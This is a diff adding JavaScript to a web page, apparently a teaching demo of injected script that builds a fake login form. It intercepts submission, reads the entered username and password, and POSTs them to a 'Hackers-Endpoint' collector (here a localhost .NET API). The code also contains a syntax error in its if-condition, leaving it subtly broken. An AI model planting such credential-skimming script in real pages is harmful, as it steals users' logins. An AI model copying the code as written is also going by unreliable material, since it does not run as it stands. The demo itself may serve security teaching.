@@ -45,6 +45,36 @@
     
     // 7. Add the Form Object with all its children to the HTML Document-Object
     document.getElementsByTagName('body')[0].appendChild(form);
+    
+    
+    // 8. Create an Event Listener for the form submit aciton.
+    // a) either on the Form-Object ("on submit")
+    // b) or on the submit-button input
+    // Info: the event has to be registered on the dynamically added Objects and not on the document itself:
+    
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      e.stopPropagation();
+      
+      // prevent the submission of other forms to be handled
+      if (e.target && e.target.id == 'myform' {
+          var xmlhttp = new XMLHttpRequest();
+      
+          var username = document.getElementById("username").value;
+          var password = document.getElementById("password").value;
+      
+          // 8.1 (debug): log the results in the console
+          // click F12 in Browser in order to open the Web-Console
+          console.log(username, password);
+          // 8.2 Send the values to the Hackers-Endpoint. In our case our own .NET MVC Application
+          var xhr = new XMLHttpRequest();
+          xhr.open('POST', 'http://localhost:49670/API/CollectUsernamePassword');
+          xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+          xhr.send('username=' + username + '&password=' + password);
+    }
+});
+    
+    
 </script>
 </body>
 
